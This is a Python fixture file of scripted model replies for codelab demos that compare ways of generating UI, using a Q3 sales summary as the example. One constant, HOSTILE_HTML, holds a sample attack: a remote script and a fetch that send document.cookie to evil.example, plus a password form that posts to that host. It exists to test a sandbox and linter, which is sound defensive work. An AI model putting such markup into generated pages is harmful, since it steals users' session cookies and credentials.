"""One scenario for every codelab: "Give me a Q3 sales summary".

Using the same scenario in all 24 demos lets you compare the formats directly.
Every model reply below is SCRIPTED so the demos run offline and deterministically.
"""
import json

SALES = {"revenue": "$1.24M", "growth": "+8.2%", "regions": {"NA": 520, "EMEA": 410, "APAC": 310}}

# STATIC: the model only picks a component that already exists in app code, plus values.
STATIC_CALL = {"name": "show_metric",
               "arguments": {"label": "Q3 revenue", "value": SALES["revenue"], "delta": SALES["growth"]}}

# DECLARATIVE: a flat element map (ids -> node). Flat maps stream; nested trees do not.
DECL_SPEC = {
    "root": "page",
    "elements": {
        "page": {"type": "Stack", "props": {}, "children": ["title", "kpi", "chart", "more"]},
        "title": {"type": "Heading", "props": {"text": "Q3 sales summary"}},
        "kpi": {"type": "Metric", "props": {"label": "Revenue", "value": SALES["revenue"], "delta": SALES["growth"]}},
        "chart": {"type": "BarChart", "props": {"data": SALES["regions"]}},
        "more": {"type": "Button", "props": {"label": "Show EMEA details", "action": "show_region:EMEA"}},
    },
}

# A deliberately wrong reply: "Gauge" is not in the catalog. Used by the correction loops.
BAD_SPEC = json.loads(json.dumps(DECL_SPEC))
BAD_SPEC["elements"]["kpi"] = {"type": "Gauge", "props": {"label": "Revenue", "value": 1.24}}

# OPEN-ENDED: the model writes markup. Anything goes, so it must be sandboxed.
OPEN_HTML = """<div style="font-family:sans-serif;padding:16px">
<h2>Q3 sales summary</h2>
<p><b>$1.24M</b> revenue, up 8.2%</p>
<svg width="260" height="90">
<rect x="0" y="0" width="208" height="24" fill="#4f46e5"/><text x="214" y="17">NA</text>
<rect x="0" y="30" width="164" height="24" fill="#4f46e5"/><text x="170" y="47">EMEA</text>
<rect x="0" y="60" width="124" height="24" fill="#4f46e5"/><text x="130" y="77">APAC</text>
</svg><br>
<button onclick="parent.postMessage({type:'action',name:'show_region',arg:'EMEA'},'*')">Show EMEA details</button>
</div>"""

# A hostile reply, to prove the sandbox and the linter do their job.
HOSTILE_HTML = """<div>Totally normal chart</div>
<script src="https://evil.example/steal.js"></script>
<script>fetch('https://evil.example/c?d='+document.cookie)</script>
<form action="https://evil.example/login"><input name="password"></form>"""

# MIXED: catalog components plus ONE escape hatch node for a custom region (a hand-drawn chart).
MIXED_HTML = """<svg width="260" height="90" style="font-family:sans-serif">
<rect x="0" y="0" width="208" height="24" fill="#db2777"/><text x="214" y="17">NA</text>
<rect x="0" y="30" width="164" height="24" fill="#db2777"/><text x="170" y="47">EMEA</text>
<rect x="0" y="60" width="124" height="24" fill="#db2777"/><text x="130" y="77">APAC</text></svg>"""
MIXED_SPEC = json.loads(json.dumps(DECL_SPEC))
MIXED_SPEC["elements"]["chart"] = {"type": "HtmlArtifact", "props": {"html": MIXED_HTML, "height": 110}}
